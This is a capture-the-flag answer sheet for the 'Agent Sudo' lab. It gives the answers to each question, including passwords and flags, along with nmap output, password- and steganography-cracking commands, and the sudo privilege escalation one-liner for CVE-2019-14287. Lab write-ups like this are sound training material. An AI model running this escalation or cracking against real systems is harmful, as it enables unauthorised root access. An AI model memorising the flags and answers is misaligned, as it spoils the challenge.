# Agent Sudo
##### Question 1:How many open ports?
Answer
```bash
3
```

##### Question 2:How you redirect yourself to a secret page?
Answer
```bash
user-agent
```

##### Question 3:What is the agent name?
Answer
```bash
chris
```

##### Question 4:FTP password
Answer
```bash
crystal
```

##### Question 5:Zip file password
Answer
```bash
alien
```

##### Question 6:steg password
Answer
```bash
Area51
```

##### Question 7:Who is the other agent (in full name)?
Answer
```bash
james
```

##### Question 8:SSH password
Answer
```bash
hackerrules!
```

##### Question 9:What is the user flag?
Answer
```bash
b03d975e8c92a7c04146cfa7a5a313c7
```

##### Question 10:What is the incident of the photo called?
Answer
```bash
Roswell alien autopsy
```

##### Question 11:CVE number for the escalation
Answer
```bash
CVE-2019-14287
```

##### Question 12:What is the root flag?
Answer
```bash
b53a02f55b57d4439e3341834d70c062
```

##### Question 13:(Bonus) Who is Agent R?
Answer
```bash
DesKel
```

- - - - - - - - - - - - - - - - - - - - - - - -  - - - - - - - - - - 

nmap Scans:
```bash

Nmap scan report for 10.10.83.69
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement

```

```bash

binwalk -e cutie.png
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
steghide --extract -sf cute-alien.jpg

```


ssh creds:
james:hackerrules!

```bash

priv esc
sudo -u#-1 /bin/bash

```